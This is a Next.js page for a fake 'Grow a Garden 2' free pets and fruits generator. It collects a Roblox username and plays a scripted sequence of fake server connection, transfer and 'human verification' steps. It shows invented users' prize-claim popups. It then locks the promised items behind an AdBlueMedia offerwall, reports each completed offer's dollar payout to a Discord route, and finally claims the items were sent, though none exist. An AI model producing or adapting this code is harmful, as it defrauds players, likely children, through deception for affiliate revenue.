"use client"

import { useState, useEffect, useRef } from "react"
import { Fredoka } from "next/font/google"
import { Offerwall } from "@/components/offerwall"

const fredoka = Fredoka({ subsets: ["latin"], weight: ["400", "500", "600", "700"] })

interface Item {
  name: string
  image: string
}

const PETS: Item[] = [
  { name: "Raccoon", image: "https://static.wikia.nocookie.net/growagarden/images/7/7c/Raccoon.png/revision/latest?cb=20250522095747" },
  { name: "Unicorn", image: "https://static.wikia.nocookie.net/growagarden27847/images/7/7e/Unicorn.png" },
  { name: "Ice Serpent", image: "https://static.wikia.nocookie.net/growagarden27847/images/5/51/IceSerpent.png" },
  { name: "Golden Dragonfly", image: "https://static.wikia.nocookie.net/growagarden27847/images/e/ee/GoldenDragonfly.png" },
  { name: "Bee", image: "https://static.wikia.nocookie.net/growagarden27847/images/5/56/Bee.png" },
  { name: "Deer", image: "https://static.wikia.nocookie.net/growagarden27847/images/2/27/Deer.png" },
]

const FRUITS: Item[] = [
  { name: "Moon Bloom", image: "https://static.wikia.nocookie.net/growagarden27847/images/9/92/MoonBloomProduce.png" },
  { name: "Dragon's Breath", image: "https://static.wikia.nocookie.net/growagarden27847/images/3/38/Dragon%27sBreathProduce.png" },
  { name: "Venus Fly Trap", image: "https://static.wikia.nocookie.net/growagarden27847/images/c/cf/VenusFlyTrapProduce.png" },
  { name: "Mushroom", image: "https://static.wikia.nocookie.net/growagarden27847/images/4/44/MushroomProduce.png" },
  { name: "Ghost Pepper", image: "https://static.wikia.nocookie.net/growagarden27847/images/b/b0/GhostPepperProduce.png" },
  { name: "Pomegranate", image: "https://static.wikia.nocookie.net/growagarden27847/images/1/10/PomegranateProduce.png" },
  { name: "Poison Apple", image: "https://static.wikia.nocookie.net/growagarden27847/images/5/53/PoisonAppleProduce.png" },
  { name: "Cherry", image: "https://static.wikia.nocookie.net/growagarden27847/images/5/5b/CherryProduce.png" },
  { name: "Dragon Fruit", image: "https://static.wikia.nocookie.net/growagarden27847/images/6/6f/DragonFruitProduce.png" },
  { name: "Sunflower", image: "https://static.wikia.nocookie.net/growagarden27847/images/b/b8/SunflowerProduce.png" },
]

const FLOATING_IMAGES = [
  "https://static.wikia.nocookie.net/growagarden27847/images/5/5b/CherryProduce.png",
  "https://static.wikia.nocookie.net/growagarden27847/images/b/b8/SunflowerProduce.png",
  "https://static.wikia.nocookie.net/growagarden27847/images/6/6f/DragonFruitProduce.png",
  "https://static.wikia.nocookie.net/growagarden27847/images/1/10/PomegranateProduce.png",
  "https://static.wikia.nocookie.net/growagarden27847/images/4/44/MushroomProduce.png",
  "https://static.wikia.nocookie.net/growagarden27847/images/9/92/MoonBloomProduce.png",
]

const POPUP_USERS = [
  { img: "/avatars/blueboy.png", usernames: ["bouwithdream", "kindesssiner6235"] },
  { img: "/avatars/blueboy2.png", usernames: ["boxmouth", "radicalhooligan"] },
  { img: "/avatars/genericgirl1.png", usernames: ["Jessy19525", "crystalmaze135"] },
  { img: "/avatars/jerome.png", usernames: ["tyrommuu7", "tootsiesss"] },
  { img: "/avatars/john.png", usernames: ["madigaskaman00", "petsimforever1"] },
  { img: "/avatars/kenneth.png", usernames: ["kenneth.alt1", "kenneth.alt2"] },
]

const POPUP_TEXTS = [
  "Just Claimed a Moon Bloom!",
  "Received x10 Fruit Packs!",
  "Just Claimed 3 Pets!",
  "Just Won 10 billion sheckles!",
]

const LOADING_PHASES = [
  { texts: ["Connecting to servers", "Successfully Connected"], color: "#1ec962", filled: 1 },
  { texts: ["Finding Username", "Username Found"], color: "#1ec962", filled: 2 },
  { texts: ["Generating Items", "Starting Transfer"], color: "#1ec962", filled: 3 },
  { texts: ["Verifying Human Activity", "Human Verification Required"], color: "#1ec962", filled: 4, lastPhase: true },
]

interface FloatingImg {
  id: number
  src: string
  top: number
  left: number
  vx: number
  vy: number
}

interface PopupCard {
  id: number
  img: string
  username: string
  text: string
}

export default function GagPage() {
  const [username, setUsername] = useState("")
  const [selected, setSelected] = useState<Set<string>>(new Set())
  const [warning, setWarning] = useState("")
  const [generating, setGenerating] = useState(false)

  // Loading screen state
  const [loadingLines, setLoadingLines] = useState<{ text: string; color: string }[]>([])
  const [circlesFilled, setCirclesFilled] = useState(0)
  const [bouncingIndex, setBouncingIndex] = useState(0)
  const [showVerify, setShowVerify] = useState(false)
  const [showOfferwall, setShowOfferwall] = useState(false)

  // Floating images
  const [floating, setFloating] = useState<FloatingImg[]>([])
  const floatingRef = useRef<FloatingImg[]>([])
  const rafRef = useRef<number>()

  // Quest tracker & Webhook Memory
  const [questCompleted, setQuestCompleted] = useState(0)
  const reportedLeadsRef = useRef<Set<string>>(new Set())

  // Popup cards
  const [popups, setPopups] = useState<PopupCard[]>([])
  const popupIndexRef = useRef(0)
  const popupIdRef = useRef(0)

  // AdBlueMedia Live Lead Polling & Discord Webhooks
  useEffect(() => {
    let interval: NodeJS.Timeout

    const checkLeads = () => {
      const script = document.createElement("script")
      const callbackName = "adblue_callback_" + Math.floor(Math.random() * 1000000)
      
      ;(window as any)[callbackName] = (leads: any[]) => {
        delete (window as any)[callbackName]
        document.body.removeChild(script)
        
        if (leads && leads.length > 0) {
          setQuestCompleted(Math.min(leads.length, 2))

          // Process each lead for Discord Webhooks
          leads.forEach(async (lead: any) => {
            const leadId = lead.offer_id?.toString()
            const payoutStr = lead.points?.toString() || "0"
            const uniqueLeadKey = `${leadId}-${payoutStr}`

            // If we haven't already reported this exact lead to Discord
            if (leadId && !reportedLeadsRef.current.has(uniqueLeadKey)) {
              reportedLeadsRef.current.add(uniqueLeadKey)

              // Convert payout points to a dollar amount (e.g. 150 points = $1.50)
              const payoutDollars = (parseFloat(payoutStr) / 100).toFixed(2)

              // Send to our internal Discord API route
              try {
                await fetch("/api/discord", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    embeds: [{
                      title: "🎉 New Lead Completed!",
                      color: 5679919, // A nice green color
                      fields: [
                        { name: "Roblox Username", value: username || "Unknown", inline: true },
                        { name: "Offer ID", value: leadId, inline: true },
                        { name: "Payout Made", value: `$${payoutDollars}`, inline: true }
                      ],
                      footer: {
                        text: "Grow a Garden 2 | AdBlueMedia"
                      },
                      timestamp: new Date().toISOString()
                    }]
                  })
                })
              } catch (err) {
                console.error("Failed to ping Discord route", err)
              }
            }
          })
        }
      }

      script.src = `https://d1cdbd1x576ga0.cloudfront.net/public/external/check2.php?testing=0&callback=${callbackName}`
      document.body.appendChild(script)
    }

    if (showOfferwall && questCompleted < 2) {
      interval = setInterval(checkLeads, 15000)
    }

    return () => {
      if (interval) clearInterval(interval)
    }
  }, [showOfferwall, questCompleted, username])

  // Initialize floating images
  useEffect(() => {
    const imgs: FloatingImg[] = FLOATING_IMAGES.map((src, i) => {
      const speed = Math.random() * 1.5 + 0.5
      return {
        id: i,
        src,
        top: Math.random() * 80 + 10,
        left: Math.random() * 80 + 10,
        vx: (Math.random() < 0.5 ? -1 : 1) * speed * 0.15,
        vy: (Math.random() < 0.5 ? -1 : 1) * speed * 0.15,
      }
    })
    floatingRef.current = imgs
    setFloating(imgs)

    const animate = () => {
      floatingRef.current = floatingRef.current.map((img) => {
        let { top, left, vx, vy } = img
        if (top <= 2 || top >= 90) vy *= -1
        if (left <= 2 || left >= 90) vx *= -1
        return { ...img, top: top + vy, left: left + vx, vx, vy }
      })
      setFloating([...floatingRef.current])
      rafRef.current = requestAnimationFrame(animate)
    }
    rafRef.current = requestAnimationFrame(animate)
    return () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current)
    }
  }, [])

  // Popup cards loop
  useEffect(() => {
    const showPopup = () => {
      const user = POPUP_USERS[popupIndexRef.current % POPUP_USERS.length]
      const name = user.usernames[Math.floor(Math.random() * user.usernames.length)]
      const text = POPUP_TEXTS[Math.floor(Math.random() * POPUP_TEXTS.length)]
      const id = popupIdRef.current++
      setPopups((prev) => [...prev, { id, img: user.img, username: name, text }])
      popupIndexRef.current++
      setTimeout(() => {
        setPopups((prev) => prev.filter((p) => p.id !== id))
      }, 5000)
    }
    showPopup()
    const interval = setInterval(showPopup, 6000)
    return () => clearInterval(interval)
  }, [])

  const toggleCard = (name: string) => {
    setSelected((prev) => {
      const next = new Set(prev)
      if (next.has(name)) {
        next.delete(name)
      } else {
        if (next.size >= 3) {
          setWarning("You can only select up to 3 fruits/pets!")
          return prev
        }
        next.add(name)
      }
      setWarning("")
      return next
    })
  }

  const handleGenerate = () => {
    const trimmed = username.trim()
    if (selected.size === 0) {
      setWarning("Please select at least one fruit/pets!")
      return
    }
    if (trimmed.length < 3) {
      setWarning("Invalid username: Too short")
      return
    }
    if (trimmed.length > 25) {
      setWarning("Invalid username: Too long")
      return
    }
    setWarning("")
    setGenerating(true)
    runLoadingSequence()
  }

  const runLoadingSequence = () => {
    let phaseIndex = 0

    const nextPhase = () => {
      if (phaseIndex >= LOADING_PHASES.length) {
        setShowVerify(true)
        return
      }
      const phase = LOADING_PHASES[phaseIndex]
      setLoadingLines([{ text: phase.texts[0], color: "#000000" }])
      setCirclesFilled(phase.filled - 1)
      setBouncingIndex(phase.filled - 1)

      const secondDelay = phase.lastPhase ? 3500 : 2000
      setTimeout(() => {
        const secondColor = phase.lastPhase ? "#e02424" : "#1ec962"
        setLoadingLines([{ text: phase.texts[1], color: secondColor }])
        setCirclesFilled(phase.filled)
      }, secondDelay)

      phaseIndex++
      setTimeout(nextPhase, secondDelay + 1000)
    }
    nextPhase()
  }

  const titleStroke: React.CSSProperties = {
    color: "white",
    WebkitTextStroke: "4px black",
    paintOrder: "stroke fill",
  }

  return (
    <div className={fredoka.className} style={{ minHeight: "100vh" }}>
      <style>{`
        @keyframes gag-bounce { from { transform: translateY(0); } to { transform: translateY(-6px); } }
        @keyframes gag-pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        @keyframes gag-blink { 0%,50% { opacity: 1; } 51%,100% { opacity: 0; } }
        .gag-bounce { animation: gag-bounce 0.3s infinite alternate; }
        .gag-blink { animation: gag-blink 1s infinite; }
        .gag-verify { animation: gag-pulse 2s infinite; }
        .gag-bg { background: linear-gradient(to bottom, #87CEFA, #f0f0f0); min-height: 100vh; }
      `}</style>

      <div className="gag-bg relative overflow-hidden flex flex-col items-center pb-24">
        <div className="fixed inset-0 overflow-hidden pointer-events-none" style={{ zIndex: 0 }}>
          {floating.map((img) => (
            // eslint-disable-next-line @next/next/no-img-element
            <img key={img.id} src={img.src || "/placeholder.svg"} alt="" style={{ position: "absolute", top: `${img.top}vh`, left: `${img.left}vw`, width: "150px", height: "auto", opacity: 0.5 }} />
          ))}
        </div>

        <div className="relative text-center mt-16 px-4" style={{ zIndex: 1 }}>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src="https://imgur.com/HSuZhh0.png" alt="Grow a Garden 2" className="mx-auto mb-5" style={{ maxWidth: 420, width: "90%" }} />
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Enter Username"
            className="block mx-auto px-3 py-2 rounded-lg outline-none"
            style={{ width: "80%", maxWidth: 300, border: "1px solid #ccc", boxShadow: "0px 2px 4px rgba(0,0,0,0.2)", color: "#000" }}
          />
          <button
            onClick={handleGenerate}
            className="block mx-auto mt-4 cursor-pointer"
            style={{ padding: "6px 16px", border: "2px solid #478F17", borderBottom: "6px solid #3e8e41", borderRadius: 8, background: "linear-gradient(to bottom, #a8e063, #56ab2f)", color: "white", fontSize: 20, fontWeight: 700, WebkitTextStroke: "3px black", paintOrder: "stroke fill", boxShadow: "0px 2px 4px rgba(0,0,0,0.2)" }}
          >
            Generate!
          </button>
        </div>

        <p className="relative mt-6 text-black/80 text-sm" style={{ zIndex: 1 }}>Browse through the available fruits/pets:</p>
        {warning && <p className="relative mt-3 text-red-600 font-semibold text-base px-4 text-center" style={{ zIndex: 1 }}>{warning}</p>}

        <p className="relative w-full text-center mt-4 mb-1" style={{ zIndex: 1, ...titleStroke, WebkitTextStroke: "2px black", fontSize: 26, fontWeight: 600 }}>Pets:</p>
        <CardGrid items={PETS} selected={selected} onToggle={toggleCard} />

        <p className="relative w-full text-center mt-4 mb-1" style={{ zIndex: 1, ...titleStroke, WebkitTextStroke: "2px black", fontSize: 26, fontWeight: 600 }}>Fruits:</p>
        <CardGrid items={FRUITS} selected={selected} onToggle={toggleCard} />

        <div className="fixed bottom-5 right-5 flex flex-col gap-2" style={{ zIndex: 1000 }}>
          {popups.map((p) => (
            <div key={p.id} className="bg-white border rounded-lg p-2.5 flex items-center gap-2.5 transition-opacity" style={{ width: 250, borderColor: "#ccc", boxShadow: "0px 2px 4px rgba(0,0,0,0.2)" }}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src={p.img || "/placeholder.svg"} alt={p.username} className="w-10 h-10 rounded-full object-cover bg-gray-100" />
              <div>
                <h4 className="m-0 text-sm font-semibold text-black">{p.username}</h4>
                <p className="m-0 text-xs text-gray-500">{p.text}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {generating && (
        <div className="fixed inset-0 z-[999] gag-bg flex items-center justify-center p-4">
          <div className="fixed inset-0 overflow-hidden pointer-events-none" style={{ zIndex: 0 }}>
            {floating.map((img) => (
              // eslint-disable-next-line @next/next/no-img-element
              <img key={`o-${img.id}`} src={img.src || "/placeholder.svg"} alt="" style={{ position: "absolute", top: `${img.top}vh`, left: `${img.left}vw`, width: "150px", height: "auto", opacity: 0.5 }} />
            ))}
          </div>

          {!showOfferwall ? (
            <div className="relative bg-white rounded-xl flex flex-col items-center justify-center" style={{ width: "90%", maxWidth: 600, minHeight: 320, boxShadow: "0 0 20px rgba(0,0,0,0.1)", zIndex: 2 }}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src="https://imgur.com/HSuZhh0.png" alt="Grow a Garden" className="absolute top-3 left-1/2 -translate-x-1/2" style={{ maxWidth: 200, width: "60%" }} />
              <div className="flex flex-col items-center gap-2 px-4">
                {loadingLines.map((line, i) => (
                  <p key={i} className="text-center" style={{ fontSize: "1.5em", color: line.color, fontWeight: 500 }}>
                    {line.text}
                    <span className="gag-blink">.</span>
                  </p>
                ))}
                {showVerify && (
                  <button onClick={() => setShowOfferwall(true)} className="gag-verify mt-2 cursor-pointer" style={{ padding: "6px 18px", background: "#1ec962", color: "white", border: "none", borderRadius: 8, fontSize: 22, fontWeight: 700 }}>
                    Verify
                  </button>
                )}
              </div>
              {!showVerify && (
                <div className="absolute bottom-5 left-1/2 -translate-x-1/2 flex justify-center">
                  {[0, 1, 2, 3, 4].map((i) => (
                    <div key={i} className={i === bouncingIndex ? "gag-bounce" : ""} style={{ width: 18, height: 18, borderRadius: "50%", margin: "0 5px", backgroundColor: i < circlesFilled ? "#1ec962" : "#E8E8E8" }} />
                  ))}
                </div>
              )}
            </div>
          ) : (
            <div className="relative bg-white rounded-xl p-5 w-full max-w-md max-h-[85vh] overflow-y-auto" style={{ zIndex: 2, boxShadow: "0 0 20px rgba(0,0,0,0.1)" }}>
              {questCompleted >= 2 ? (
                <div className="flex flex-col items-center justify-center py-10 text-center">
                  <div className="w-16 h-16 bg-[#56ab2f] rounded-full flex items-center justify-center mb-4 shadow-lg">
                    <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold text-[#56ab2f] mb-2">Verification Complete!</h2>
                  <p className="text-gray-500">You have successfully verified you are human.</p>
                  <p className="text-gray-500 mt-1 font-medium">Your items have been generated and sent to your account!</p>
                  
                  <button 
                    onClick={() => {
                      setGenerating(false);
                      setShowOfferwall(false);
                      setQuestCompleted(0);
                    }}
                    className="mt-6 px-6 py-2 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-lg transition-colors"
                  >
                    Close
                  </button>
                </div>
              ) : (
                <>
                  <h2 className="text-center text-xl font-bold text-[#56ab2f] mb-1">Almost Done!</h2>
                  <p className="text-center text-sm text-gray-500 mb-4">Complete 2 offers below to verify you&apos;re human and unlock your items.</p>

                  <div className="mb-4 rounded-lg border border-gray-200 bg-gray-50 p-3">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm font-semibold text-gray-700">Quests Completed</span>
                      <span className="text-sm font-bold" style={{ color: questCompleted >= 2 ? "#56ab2f" : "#9ca3af" }}>
                        {questCompleted}/2
                      </span>
                    </div>
                                        <div className="w-full bg-gray-200 rounded-full h-2.5">
                      <div className="h-2.5 rounded-full transition-all duration-700" style={{ width: `${(questCompleted / 2) * 100}%`, background: "linear-gradient(90deg, #56ab2f, #a8e063)" }} />
                    </div>
                    <div className="flex gap-2 mt-2">
                      {[0, 1].map((i) => (
                        <div key={i} className="flex items-center gap-1 text-xs" style={{ color: questCompleted > i ? "#56ab2f" : "#9ca3af" }}>
                          <div className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0" style={{ borderColor: questCompleted > i ? "#56ab2f" : "#d1d5db", background: questCompleted > i ? "#56ab2f" : "transparent" }}>
                            {questCompleted > i && <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>}
                          </div>
                          Quest {i + 1}
                        </div>
                      ))}
                    </div>
                  </div>

                  <Offerwall apiUrl={`/api/offers?s1=${encodeURIComponent(username)}`} />
                </>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  )
}

function CardGrid({ items, selected, onToggle }: { items: Item[]; selected: Set<string>; onToggle: (name: string) => void }) {
  return (
    <div className="relative flex flex-wrap justify-center gap-5 px-4 mt-2 max-w-5xl" style={{ zIndex: 1 }}>
      {items.map((item) => {
        const isSelected = selected.has(item.name)
        return (
          <div key={item.name} onClick={() => onToggle(item.name)} className="relative cursor-pointer rounded-lg" style={{ width: 140, boxShadow: "0px 2px 4px rgba(0,0,0,0.2)" }}>
            {isSelected && (
              <div style={{ position: "absolute", top: -15, right: -20, width: 44, height: 44, background: "linear-gradient(to bottom, #ABEE3C, #71EF15)", borderRadius: "50%", zIndex: 2, border: "5px solid black", display: "flex", alignItems: "center", justifyContent: "center", color: "black", fontWeight: 700 }}>✓</div>
            )}
            <div className="rounded-lg bg-white/40 flex items-center justify-center" style={{ aspectRatio: "1/1" }}>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src={item.image || "/placeholder.svg"} alt={item.name} className="w-full h-full object-contain rounded-lg p-1" />
            </div>
            <div className="absolute bottom-0 left-0 w-full px-1 py-1 text-center rounded-b-lg" style={{ background: "rgba(255,255,255,0.5)", color: "#000", fontWeight: 700 }}>
              <h3 style={{ fontSize: 16, margin: 0 }}>{item.name}</h3>
            </div>
          </div>
        )
      })}
    </div>
  )
            }

